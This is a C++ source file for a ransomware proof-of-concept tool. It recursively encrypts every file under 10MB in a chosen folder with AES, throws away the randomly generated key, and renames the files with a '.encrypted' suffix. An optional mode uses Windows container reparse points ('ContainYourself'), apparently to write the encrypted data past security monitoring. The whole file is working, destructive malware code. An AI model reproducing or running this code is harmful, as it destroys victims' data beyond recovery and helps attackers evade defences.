#pragma once
#include <filesystem>
#include <fstream>
#include <iostream>
#include <set>
#include <stdexcept>
#include <string>
#include <vector>
#include <Windows.h>

#include "cryptlib.h"
#include "rijndael.h"
#include "modes.h"
#include "osrng.h"

#include "ContainYourself.h"

using std::string;
using std::wstring;
using std::to_wstring;
using std::wcout;
using std::endl;
using std::set;
using std::vector;
using std::ifstream;
using std::ofstream;
using std::filesystem::recursive_directory_iterator;
using std::exception;
using std::runtime_error;
using namespace CryptoPP;

const wstring MAIN_VOLUME(L"C:");
const wstring TEMP_FOLDER(L"\\temp\\ContainYourselfPoc\\");
constexpr DWORD MAX_FILE_SIZE = 10000000; //10MB

wstring g_FolderToEncrypt;wstring g_LastFile;
bool g_UseContainYourselfWrite = false;

constexpr bool IsCmdOptionExists(wchar_t** Begin, wchar_t** End, const std::wstring& Option) { return std::find(Begin, End, Option) != End; }

constexpr wstring GetCmdOption(wchar_t** Begin, wchar_t** End, const std::wstring& Option)
{
    wchar_t** itr = std::find(Begin, End, Option);
    if (itr != End && ++itr != End)
        return *itr;

    return L"";
}

struct HandleDeleter
{
    void operator()(const HANDLE& Handle) const
    {
        if (INVALID_HANDLE_VALUE != Handle && nullptr != Handle)
            CloseHandle(Handle);
    }
};
using AutoHandle = std::unique_ptr<void, HandleDeleter>;

bool EncryptData(vector<uint8_t>& DataVector)
{
    AutoSeededRandomPool prng;
    SecByteBlock key(AES::DEFAULT_KEYLENGTH);
    SecByteBlock iv(AES::BLOCKSIZE);

    prng.GenerateBlock(key, key.size());
    prng.GenerateBlock(iv, iv.size());
    vector<uint8_t> cipher;

    CBC_Mode< AES >::Encryption e;
    e.SetKeyWithIV(key, key.size(), iv);

    VectorSource s(DataVector, true,
        new StreamTransformationFilter(e,
            new VectorSink(cipher)
        ) // StreamTransformationFilter
    ); // StringSource

    DataVector.clear();
    DataVector.assign(cipher.begin(), cipher.end());
    return true;
}

bool FileEncryption(const std::filesystem::directory_entry& FilePathToEncrypt)
{
    AutoHandle fileAutoHandle(CreateFileW(FilePathToEncrypt.path().c_str(),
        GENERIC_READ | GENERIC_WRITE,
        0,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr));

    if (INVALID_HANDLE_VALUE == fileAutoHandle.get())
        return false;

    const auto fileSize = GetFileSize(fileAutoHandle.get(), nullptr);
    if (0 == fileSize || INVALID_FILE_SIZE == fileSize || MAX_FILE_SIZE < fileSize)
        return false;

    const std::unique_ptr<BYTE> fileData(new BYTE[fileSize]);
    DWORD bytesRead;
    if (!ReadFile(fileAutoHandle.get(), fileData.get(), fileSize, &bytesRead, nullptr))
        return false;

    if (bytesRead != fileSize)
        return false;

    vector dataVector(fileData.get(), fileData.get() + fileSize);

    EncryptData(dataVector);

    if (g_UseContainYourselfWrite)
    {
        fileAutoHandle.reset();

        std::filesystem::rename(FilePathToEncrypt.path(), FilePathToEncrypt.path().c_str() + wstring(L".encrypted"));

	    const auto targetFileRelativePath = TEMP_FOLDER + wstring(FilePathToEncrypt.path().filename());

        wcout << "[*] Setting reparse point: " << FilePathToEncrypt.path() << endl;
        ContainYourself::SetWciReparsePoint(FilePathToEncrypt.path().c_str()  + wstring(L".encrypted"), targetFileRelativePath, IO_REPARSE_TAG_WCI_1);

        fileAutoHandle.reset(CreateFileW((MAIN_VOLUME + targetFileRelativePath).c_str(),
            GENERIC_READ | GENERIC_WRITE,
            0,
            nullptr,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            nullptr));

        if (INVALID_HANDLE_VALUE == fileAutoHandle.get())
            return false;

        if (!WriteFile(fileAutoHandle.get(), dataVector.data(), dataVector.size(), &bytesRead, nullptr))
            cout << "Error writing to file" << endl;

        wcout << "[*] Wrote encrypted data to: " << (MAIN_VOLUME + targetFileRelativePath).c_str() << endl;

        return true;
    }

    SetFilePointer(fileAutoHandle.get(), 0, nullptr, FILE_BEGIN);

    if (WriteFile(fileAutoHandle.get(), dataVector.data(), dataVector.size(), &bytesRead, nullptr))
    {
    	wcout << L"[+] File encrypted: " << FilePathToEncrypt << endl;
    }

    fileAutoHandle.reset();

    std::filesystem::rename(FilePathToEncrypt.path(), FilePathToEncrypt.path().c_str() + wstring(L".encrypted"));

    return true;
}

void EncryptFolder(const wstring& FolderPath, const wstring& LastFile)
{
    if (g_UseContainYourselfWrite)
		wcout << L"[+] Setting reparse points on source files..." << endl;
    else
        wcout << L"[+] Encrypting files... " << endl;

    for (auto& directoryEntry : recursive_directory_iterator(FolderPath))
    {
        try
        {
            if (directoryEntry.is_regular_file())
            {
                FileEncryption(directoryEntry);
            }
        }
        catch (std::exception& e)
        {
            wcout << e.what() << endl;
        }
        catch (...) {}
    }

    if (g_UseContainYourselfWrite)
    {
	    try
	    {
            HANDLE siloHandle;
            ContainYourself::InitContainer(GetCurrentProcess(), ContainerUsage::FileOverride, &siloHandle);
	    }
	    catch (std::exception& e)
	    {
            wcout << e.what() << endl;
            return;
	    }
        catch (...)
        {
            return;
        }

        wcout << L"[+] Encrypting files..." << endl;

        AutoHandle autoFileHandle;
        for (auto& directoryEntry : recursive_directory_iterator(FolderPath))
        {
            autoFileHandle.reset(CreateFileW(directoryEntry.path().c_str(),
	                                            GENERIC_READ | GENERIC_WRITE,
	                                            0,
	                                            nullptr,
	                                            OPEN_EXISTING,
	                                            FILE_ATTRIBUTE_NORMAL,
	                                            nullptr));

            if (INVALID_HANDLE_VALUE != autoFileHandle.get())
                wcout << L"[+] File encrypted: " << FolderPath << L"\\" << wstring(directoryEntry.path().filename()) << endl;
        }
    }
}

int wmain(int argc, wchar_t* argv[])
{
    if (IsCmdOptionExists(argv, argv + argc, L"-h") || IsCmdOptionExists(argv, argv + argc, L"/h"))
    {
        wcout << "Ransomware POC tool that encrypts a given directory." << endl << endl;
        wcout << "Command line arguments:" << endl;
        wcout << "	-f  - Target folder to encrypt" << endl;
        wcout << "	-c  - [optional] Use ContainYourself write method" << endl;

        return -1;
    }

   g_FolderToEncrypt = GetCmdOption(argv, argv + argc, L"-f");
	g_UseContainYourselfWrite = IsCmdOptionExists(argv, argv + argc, L"-c");

    g_UseContainYourselfWrite = false;

    if (g_FolderToEncrypt.empty())
    {
        wcout << "[-] Excpected a folder to encrypt. Use -f." << endl << endl;
        return -1;
    }

    if (g_UseContainYourselfWrite)
        CreateDirectoryW((MAIN_VOLUME + TEMP_FOLDER).c_str(), nullptr);

	EncryptFolder(g_FolderToEncrypt, g_LastFile);

    wcout << L"[+] Done." << endl;
}